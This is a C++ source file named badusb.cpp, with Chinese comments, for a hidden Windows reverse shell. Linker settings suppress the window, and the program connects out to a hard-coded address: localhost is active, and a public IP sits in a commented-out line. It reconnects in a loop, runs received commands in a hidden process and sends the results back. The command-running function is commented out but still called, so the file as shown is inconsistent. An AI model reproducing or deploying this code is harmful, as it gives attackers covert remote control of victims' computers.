// badusb.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include <stdio.h>
#include <stdlib.h>
#include <WinSock2.h>
#pragma comment(lib, "ws2_32.lib")												//加载ws2_32.lib
//#include<windows.h>

#pragma comment( linker, "/subsystem:\"windows\" /entry:\"myShell\"" )	// 设置入口地址
#pragma  warning (disable:4996)
#pragma comment(lib,"kernel32.lib")
#pragma comment(linker, "/align:256")
#pragma comment(linker, "/merge:.data=.text")
#pragma comment(linker, "/merge:.rdata=.text")

#define MAXSZ 4096

void reconnect(SOCKET* sock)
{
	*sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(*sock == INVALID_SOCKET) return;											//invalid socket
	//发起请求
	sockaddr_in sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));										//0填充
	sockAddr.sin_family = PF_INET;
	//sockAddr.sin_addr.s_addr = inet_addr("45.76.30.21");
	sockAddr.sin_addr.s_addr = inet_addr("127.0.0.1");
	sockAddr.sin_port = htons(4321);
	while(connect(*sock, (SOCKADDR* )&sockAddr, sizeof(SOCKADDR)) == SOCKET_ERROR)
	{
		Sleep(3*1000);
		//retry
	}
}
/*
BOOL PipeCmd(char *pszCmd, char *pszResultBuffer, DWORD dwResultBufferSize)
{
    HANDLE hReadPipe = NULL;
    HANDLE hWritePipe = NULL;
    SECURITY_ATTRIBUTES securityAttributes = {0};
    BOOL bRet = FALSE;
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    // 设定管道的安全属性
    securityAttributes.bInheritHandle = TRUE;
    securityAttributes.nLength = sizeof(securityAttributes);
    securityAttributes.lpSecurityDescriptor = NULL;
    // 创建匿名管道
    bRet = CreatePipe(&hReadPipe, &hWritePipe, &securityAttributes, 0);
    if (FALSE == bRet)
    {
        //ShowError("CreatePipe");
        return FALSE;
    }
    // 设置新进程参数
    si.cb = sizeof(si);
    si.hStdError = hWritePipe;
    si.hStdOutput = hWritePipe;
    si.wShowWindow = SW_HIDE;
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    // 创建新进程执行命令, 将执行结果写入匿名管道中
    bRet = CreateProcess(NULL, pszCmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    if (FALSE == bRet)
    {
        return false;
    }
    // 等待命令执行结束
    WaitForSingleObject(pi.hThread, INFINITE);
    WaitForSingleObject(pi.hProcess, INFINITE);
    // 从匿名管道中读取结果到输出缓冲区
    RtlZeroMemory(pszResultBuffer, dwResultBufferSize);
    ReadFile(hReadPipe, pszResultBuffer, dwResultBufferSize, NULL, NULL);
    // 关闭句柄, 释放内存
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(hWritePipe);
    CloseHandle(hReadPipe);
    return TRUE;
}
*/

int myShell(int argc, _TCHAR* argv[])
{
	int status;
	//MessageBoxA(NULL,"Hello","Notice",NULL);
	//初始化dll
	WSADATA wsaData;
	if(WSAStartup(MAKEWORD(2,2), &wsaData)!=0) return 1;						//wsastartup error

	//创建套接字
	SOCKET sock;// = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);

	reconnect(&sock);

	char szBuffer[MAXSZ] = {0};

	while(1)
	{
		//接收数据
		status = recv(sock, szBuffer, MAXSZ, NULL);
		if(status > 0)															//正常处理
		{
			//MessageBoxA(NULL,szBuffer,"Notice",NULL);
			if(strcmp("bye", szBuffer) == 0)
			{
				closesocket(sock);
				reconnect(&sock);
			} else if(strcmp("quit", szBuffer) == 0)
			{
				break;
			} else
			{
				char res[1024*4] = "";
				if(PipeCmd(szBuffer, res, 1024*4))
					send(sock, res, strlen(res), NULL);
				else send(sock, "fail!", strlen("fail!"), NULL);
			}
		} else if(status == 0)													//断线
		{
			closesocket(sock);
			reconnect(&sock);													//重连
		} else																	//出现异常, 主动断开连接
		{
			closesocket(sock);
			reconnect(&sock);
		}
	}
	closesocket(sock);
	WSACleanup();
	return 0;
}

